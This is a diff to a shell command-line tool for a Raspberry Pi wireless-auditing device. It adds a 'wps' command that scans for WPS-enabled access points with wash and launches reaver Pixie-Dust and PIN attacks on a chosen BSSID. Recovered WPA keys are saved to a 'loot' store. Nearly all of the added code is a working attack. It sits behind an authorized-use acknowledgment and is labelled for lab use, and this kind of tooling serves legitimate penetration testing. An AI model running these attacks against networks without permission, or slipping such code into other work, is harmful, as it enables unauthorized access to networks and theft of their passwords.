@@ -68,6 +68,12 @@ Usage: $PROG <command>
                      brute-force mask); omit --wordlist for all lists
   crack enable       Enable quick-crack (auto-crack new handshakes); disable to stop
   crack clear --yes  Clear the loot store (captures and wordlists untouched)
+  wps                List WPS results (recovered keys show on /loot too)
+  wps scan [--seconds N]     Scan for WPS-enabled APs (uses the dongle; pauses capture)
+  wps attack BSSID [--channel N] [--no-pixie] [--yes]
+                     Pixie-Dust / PIN attack on a WPS AP; asks the authorized-use
+                     ack, pauses capture, and saves a recovered key to loot
+  wps list           List WPS-recovered keys
   kiosk              Kiosk status (dashboard full-screen on an HDMI touchscreen)
   kiosk enable [--url URL]   Show the dashboard full-screen on the HDMI screen
   kiosk disable      Turn the kiosk off
@@ -1904,6 +1910,121 @@ cmd_kiosk() {
     esac
 }
 
+## wps (WPS PIN / Pixie-Dust attacks via reaver) ###########################
+# A separate attack class: WPS-enabled APs can leak the WPA PSK. It TRANSMITS,
+# so it is gated by the same authorized-use acknowledgment as capture, uses the
+# capture dongle in monitor mode, and pauses capture while it runs. Recovered
+# keys land in the crack loot store (shown on /loot). Lab / authorized use only.
+
+WPS_CAPTURE_WAS_ACTIVE=no
+
+# Put the capture dongle into monitor mode for an attack (pausing capture) and
+# echo the interface. The caller must wps_restore when done.
+wps_setup_iface() {
+    local iface
+    iface=$(capture_resolve_iface "$(cfg capture.interface auto)") \
+        || die "no monitor-capable adapter found (plug in the USB dongle)"
+    WPS_CAPTURE_WAS_ACTIVE=no
+    if systemctl is-active --quiet "$PWN_CAPTURE_SERVICE"; then
+        WPS_CAPTURE_WAS_ACTIVE=yes
+        systemctl stop "$PWN_CAPTURE_SERVICE" 2>/dev/null || true
+    fi
+    ip link set "$iface" down 2>/dev/null || true
+    iw dev "$iface" set type monitor 2>/dev/null || true
+    ip link set "$iface" up 2>/dev/null || true
+    echo "$iface"
+}
+
+wps_restore() {
+    local iface=$1
+    ip link set "$iface" down 2>/dev/null || true
+    iw dev "$iface" set type managed 2>/dev/null || true
+    ip link set "$iface" up 2>/dev/null || true
+    if [ "$WPS_CAPTURE_WAS_ACTIVE" = yes ]; then
+        systemctl start --no-block "$PWN_CAPTURE_SERVICE" 2>/dev/null || true
+    fi
+}
+
+cmd_wps_scan() {
+    need_root
+    command -v wash >/dev/null 2>&1 || die "wash not installed (part of reaver)"
+    local seconds iface
+    seconds=$(cfg wps.scan_seconds 20)
+    while [ $# -gt 0 ]; do
+        case "$1" in --seconds) seconds=$2; shift 2 ;; *) die "unknown option: $1" ;; esac
+    done
+    iface=$(wps_setup_iface)
+    log "scanning for WPS-enabled APs on $iface for ${seconds}s..."
+    timeout "$seconds" wash -i "$iface" || true
+    wps_restore "$iface"
+}
+
+cmd_wps_attack() {
+    need_root
+    command -v reaver >/dev/null 2>&1 || die "reaver not installed"
+    local bssid="" channel="" pixie yes=no iface out
+    pixie=$(cfg wps.pixie_dust true)
+    while [ $# -gt 0 ]; do
+        case "$1" in
+            --channel|-c) channel=$2; shift 2 ;;
+            --no-pixie) pixie=false; shift ;;
+            --yes|-y) yes=yes; shift ;;
+            --*) die "unknown option for 'wps attack': $1" ;;
+            *) [ -z "$bssid" ] || die "one BSSID at a time"; bssid=$1; shift ;;
+        esac
+    done
+    [ -n "$bssid" ] || die "usage: $PROG wps attack <BSSID> [--channel N] [--no-pixie] [--yes]"
+    bssid=$(printf '%s' "$bssid" | tr '[:lower:]' '[:upper:]')
+    valid_mac "$bssid" || die "not a BSSID: $bssid"
+    capture_ack "$yes" || { log "not acknowledged; aborting"; return 1; }
+    iface=$(wps_setup_iface)
+    local args=(-i "$iface" -b "$bssid" -vv)
+    [ -n "$channel" ] && args+=(-c "$channel")
+    [ "$pixie" = true ] && args+=(-K 1)
+    log "attacking $bssid on channel ${channel:-auto} (pixie-dust=$pixie); this can take a while..."
+    out=$(reaver "${args[@]}" 2>&1) || true
+    printf '%s\n' "$out"
+    wps_restore "$iface"
+    # Parse + record to the loot store as pi (it owns the store).
+    PWN_OUT="$out" PWN_BSSID="$bssid" run_as_pi "$PWN_VENV_PYTHON" -I -c '
+import os
+from kestrel_pi import wps
+g = wps.parse_reaver_output(os.environ.get("PWN_OUT", ""))
+if g.get("psk") is not None:
+    wps.record_to_loot(os.environ["PWN_BSSID"], g.get("essid", ""), g["psk"], g.get("pin", ""))
+    print("recovered PSK: %r (WPS pin %s) -- saved to loot" % (g["psk"], g.get("pin", "?")))
+else:
+    print("no key recovered (the AP may be WPS-locked or not vulnerable)")
+' || true
+}
+
+cmd_wps_list() {
+    local loot="$PWN_CRACK_DIR/loot.json"
+    [ -f "$loot" ] || { echo "no WPS results yet"; return 0; }
+    PWN_LOOT="$loot" python3 -I - <<'PY'
+import json, os
+d = json.load(open(os.environ["PWN_LOOT"]))
+rows = [r for r in d.get("aps", {}).values() if r.get("source") == "wps"]
+if not rows:
+    print("no WPS results yet"); raise SystemExit(0)
+for r in rows:
+    print("%-24s %s  PSK: %s  (WPS pin %s)" % (
+        (r.get("essid") or "(hidden)")[:24], r.get("bssid", ""),
+        r.get("password", ""), r.get("wps_pin", "")))
+PY
+}
+
+cmd_wps() {
+    [ $# -gt 0 ] || { cmd_wps_list; return; }
+    local sub=$1; shift
+    case "$sub" in
+        scan) cmd_wps_scan "$@" ;;
+        attack) cmd_wps_attack "$@" ;;
+        list) cmd_wps_list ;;
+        *) die "unknown 'wps' subcommand: $sub (scan|attack|list)" ;;
+    esac
+}
+
 ## remote-train (offload agent training to a desktop host) #################
 # The `remote-train` plugin trains the learning agent on a more powerful Linux
 # host over SSH, using the pi account's key (reused from backup by default, just
@@ -2415,6 +2536,7 @@ main() {
         network) cmd_network "$@" ;;
         capture) cmd_capture "$@" ;;
         crack) cmd_crack "$@" ;;
+        wps) cmd_wps "$@" ;;
         kiosk) cmd_kiosk "$@" ;;
         plugins) cmd_plugins "$@" ;;
         web) cmd_web "$@" ;;
